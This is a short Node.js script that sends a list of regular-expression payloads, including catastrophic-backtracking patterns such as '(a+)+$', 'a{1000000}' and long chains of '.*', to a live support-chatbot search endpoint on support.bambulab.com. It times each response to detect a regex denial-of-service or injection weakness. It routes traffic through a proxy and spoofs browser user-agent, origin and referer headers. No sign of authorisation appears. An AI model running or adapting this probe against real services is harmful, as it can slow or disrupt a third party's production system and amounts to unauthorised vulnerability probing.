const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const payloads=['hot end','.*','end.*','a.*','(a+)+$','a{1000000}','[','\\','.*.*.*.*.*.*.*.*.*.*','a.*a.*a.*a.*a.*a.*a.*a.*a.*a.*b'];
(async()=>{
 for(const c of payloads){
  const times=[];
  for(let i=0;i<2;i++){
   const t0=Date.now();
   try{const r=await fetch(B+'/gw/robot/front/fuzzy',{method:'POST',headers:{'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':'probe','x-bbl-official-site-region':'EN'},body:JSON.stringify({content:c}),dispatcher:d,signal:AbortSignal.timeout(30000)});const t=await r.text();times.push({ms:Date.now()-t0,status:r.status,head:t.slice(0,80).replace(/\s+/g,' ')});}catch(e){times.push({ms:Date.now()-t0,error:e.name+': '+e.message});}
   await new Promise(x=>setTimeout(x,400));
  }
  console.log(JSON.stringify(c),JSON.stringify(times));
 }
})();
